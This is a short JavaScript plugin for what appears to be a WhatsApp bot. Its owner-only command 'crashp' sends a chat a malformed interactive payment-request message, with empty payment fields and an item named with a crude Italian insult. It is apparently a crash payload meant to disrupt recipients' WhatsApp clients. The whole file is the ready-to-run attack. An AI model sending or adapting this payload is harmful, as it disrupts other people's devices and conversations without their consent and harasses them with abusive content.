const handler = async (m, { conn }) => {
  const jid = m.chat;

  await conn.sendMessage(
    jid,
    {
      text: 'Clicca per rivedere e pagare il tuo ordine.',
      interactiveButtons: [
        {
          name: 'review_and_pay',
          buttonParamsJson: JSON.stringify({
            currency: 'EUR',
            payment_configuration: '',
            payment_type: '',
            total_amount: {
              value: '1050',
              offset: '100',
            },
            reference_id: 'varebot',
            type: 'physical-goods',
            order: {
              status: 'payment_requested', 
              description: 'Il tuo ordine di prova.',
              subtotal: {
                value: '1050',
                offset: '100',
              },
              order_type: 'PAYMENT_REQUEST',
              items: [
                {
                  retailer_id: '30566830672964949',
                  name: 'vare vi ha mangiato la fessa',
                  amount: {
                    value: '1050',
                    offset: '100',
                  },
                  quantity: '1',
                },
              ],
            },
            additional_note: 'Grazie per il tuo acquisto!',
            native_payment_methods: [],
            share_payment_status: false,
          }),
        },
      ],
    },
  );
};

handler.command = ['crashp'];
handler.owner = true;
export default handler;